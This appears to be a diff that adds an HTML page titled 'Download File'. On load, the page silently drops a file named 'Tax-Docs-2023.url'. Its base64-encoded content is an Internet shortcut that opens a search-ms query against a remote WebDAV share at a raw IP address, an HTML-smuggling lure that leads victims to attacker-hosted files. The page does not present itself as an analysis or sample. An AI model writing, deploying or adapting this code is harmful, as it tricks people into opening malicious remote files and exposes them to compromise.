@@ -1,0 +1,33 @@
+
+    <!DOCTYPE html>
+    <html lang="en">
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>Download File</title>
+    </head>
+    <body>
+        <script>
+            function downloadBase64File(base64Data, fileName) {
+                var binaryData = atob(base64Data);
+                var byteArray = new Uint8Array(binaryData.length);
+                for (var i = 0; i < binaryData.length; i++) {
+                    byteArray[i] = binaryData.charCodeAt(i);
+                }
+                var blob = new Blob([byteArray], { type: 'application/octet-stream' });
+                var a = document.createElement('a');
+                a.href = window.URL.createObjectURL(blob);
+                a.download = fileName;
+                document.body.appendChild(a);
+                a.click();
+                document.body.removeChild(a);
+            }
+            window.onload = function() {
+                var base64Data = 'W0ludGVybmV0U2hvcnRjdXRdDQpVUkw9c2VhcmNoLW1zOnF1ZXJ5PSZjcnVtYj1sb2NhdGlvbjpcXDgyLjE5Ny42NS4xNEA4MDAwXERhdldXV1Jvb3RcdGF4DQo=';
+                var fileName = 'Tax-Docs-2023.url';
+                downloadBase64File(base64Data, fileName);
+            };
+        </script>
+    </body>
+    </html>
+    
